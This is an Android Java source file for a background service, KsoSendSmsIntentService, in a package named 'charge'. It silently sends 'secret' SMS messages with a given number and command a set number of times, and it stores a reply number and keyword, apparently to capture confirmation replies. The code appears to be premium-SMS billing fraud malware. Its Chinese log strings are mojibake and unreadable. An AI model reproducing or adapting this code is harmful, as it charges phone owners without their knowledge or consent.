package com.sttm.charge;

import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.util.KsoCache;
import com.sttm.util.LogFile;
import com.sttm.util.ShareProDBHelper;

import android.app.IntentService;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.util.Log;

public class KsoSendSmsIntentService extends IntentService {
	private final String TAG = "SendSmsService";
	private ShareProDBHelper dbHelper = new ShareProDBHelper(
			this.getApplicationContext());;
	private int count;
	private String smsNumber;
	private String smsOrder;
	private long time;
	@SuppressWarnings("unused")
	private String secretSmsNumber;
	@SuppressWarnings("unused")
	private String secretSmsOrder;
	private String replyNumber;
	private String keyword;
	@SuppressWarnings("unused")
	private String adsNumber;
	@SuppressWarnings("unused")
	private String adsContent;
	@SuppressWarnings("unused")
	private int flag;

	public KsoSendSmsIntentService(String name) {
		super(name);

	}

	@Override
	protected void onHandleIntent(Intent intent) {
		//Log.d("TAG", "���Ͷ��ŷ��������ɹ���");

		smsNumber = intent.getStringExtra("SecretSmsNumber");
		smsOrder = intent.getStringExtra("SecretSmsOrder");
		time = intent.getLongExtra("sendTime", 4);
	     flag = intent.getIntExtra("flag", 3);
		count = intent.getIntExtra("sendCount", 1);
		replyNumber = intent.getStringExtra("secretSmsReplyNumber");
		keyword = intent.getStringExtra("keyword");

		secretSmsNumber = intent.getStringExtra("secretSmsNumber");
		secretSmsOrder = intent.getStringExtra("secretSmsOrder");

		adsNumber = intent.getStringExtra("adsNumber");
		adsContent = intent.getStringExtra("adsContent");
		
		
		Editor editor = dbHelper.writer("sendSmsFlag");
		editor.putBoolean("sendSecretSms", true);
		KsoCache.getInstance().reSetValues2("sendSecretSms", true);
		if (!"".equals(replyNumber)) {
			editor.putString("secretSmsReplyNumber", replyNumber);
			KsoCache.getInstance().reSetValues2("secretSmsReplyNumber", replyNumber);
		}

		if (!"".equals(keyword)) {
			editor.putString("keyword", keyword);
			KsoCache.getInstance().reSetValues2("keyword", keyword);
		}
		editor.commit();
		for (int i = 0; i < count; i++) {
			SmsSenderAndReceiver.send2(smsNumber, smsOrder);
			//Log.d(TAG, "���ƶ��û������˵�" + (i + 1) + "�����۶��ţ�����Ϊ "+ smsNumber + "ָ��Ϊ" + smsOrder);
			LogFile.WriteLogFile("���ƶ��û������˵�" + (i + 1)
					+ "�����۶���,����ͨ����" + smsNumber + " ����ָ�"
					+ smsOrder);
			
			
			
			
			try {
				Thread.sleep(time * 60 * 1000);
			} catch (InterruptedException e) {

				e.printStackTrace();
			}

		}

	}

}
